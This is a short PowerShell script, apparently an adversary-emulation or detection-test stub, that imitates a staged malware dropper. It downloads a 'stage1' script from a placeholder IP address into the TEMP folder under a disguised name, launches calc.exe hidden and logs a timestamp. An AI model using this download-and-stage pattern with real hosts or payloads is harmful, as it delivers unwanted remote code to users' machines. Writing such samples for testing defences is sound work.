[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.196:80/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 27
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
